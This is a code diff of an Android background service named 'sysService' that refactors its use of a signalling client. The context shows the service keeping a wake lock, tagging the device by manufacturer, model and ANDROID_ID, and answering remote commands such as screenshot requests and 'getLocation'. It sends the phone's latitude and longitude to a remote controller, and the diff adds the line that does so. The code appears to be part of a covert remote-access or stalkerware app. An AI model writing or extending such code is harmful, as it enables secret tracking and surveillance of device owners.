@@ -72,7 +72,6 @@ public class sysService extends Service implements SysInterface{
     Intent perData;
     int perResultCode;
     DataChannel localDataChannel;
-    SignallingClient sc;
     boolean canSend = true;
     //end variables
     // servic overwrite methods
@@ -105,8 +104,8 @@ public class sysService extends Service implements SysInterface{
         mWakeLock.acquire();
         handler = new Handler(Looper.getMainLooper());
         String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
-        sc = SignallingClient.getInstance();
-        sc.init(this, roomName);
+
+        SignallingClient.getInstance().init(this, roomName);
         try {
             if (intent.getExtras()!= null) {
                 Bundle bundle = intent.getExtras();
@@ -219,7 +218,7 @@ public class sysService extends Service implements SysInterface{
                 // toast("get screenshot");
             }
             else {
-                sc.cmd("busy");
+                SignallingClient.getInstance().cmd("busy");
             }
         }
         if (cmd.contains("getLocation")){
@@ -600,7 +599,7 @@ public class sysService extends Service implements SysInterface{
                     location -> {
                         //Log.d("Location", "my location is " + location.toString());
 
-                        sc.cmd("location,"+location.getLatitude()+","+location.getLongitude());
+                        SignallingClient.getInstance().cmd("location,"+location.getLatitude()+","+location.getLongitude());
                     });
         });
     }
